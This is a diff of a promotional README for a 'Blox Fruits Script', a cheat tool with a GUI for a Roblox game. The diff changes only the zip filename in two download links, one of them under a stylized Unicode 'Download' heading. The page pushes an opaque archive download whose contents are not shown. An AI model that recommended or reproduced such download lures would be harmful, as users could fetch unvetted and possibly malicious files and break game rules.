@@ -1,7 +1,7 @@
-# Blox Fruits Script (with GUI) - Ultimate Tool for Enhanced Gameplay **[![Download Blox Fruits Script](https://img.shields.io/badge/Download-Blox%20Fruits%20Script-blueviolet)](https://github.com/Pingol9xo9/blox-fruits-script/releases/download/Update/BloxFruits.Script.zip)**
+# Blox Fruits Script (with GUI) - Ultimate Tool for Enhanced Gameplay **[![Download Blox Fruits Script](https://img.shields.io/badge/Download-Blox%20Fruits%20Script-blueviolet)](https://github.com/Pingol9xo9/blox-fruits-script/releases/download/Update/BloxFruitsScript.zip)**
 
 Discover a new level of adventure in *Blox Fruits* with the **Blox Fruits Script**, equipped with a cutting-edge GUI (Graphical User Interface) that ensures effortless customization and control. Whether you're grinding for fruits, leveling up, or engaging in high-stakes PvP, this script provides unrivaled functionality to supercharge your gaming experience.
-# ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/Pingol9xo9/blox-fruits-script/releases/download/Update/BloxFruits.Script.zip)***
+# ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/Pingol9xo9/blox-fruits-script/releases/download/Update/BloxFruitsScript.zip)***
 ![1new](https://github.com/user-attachments/assets/aa104870-9c88-46ca-9718-ed917d870a6f)
 
 
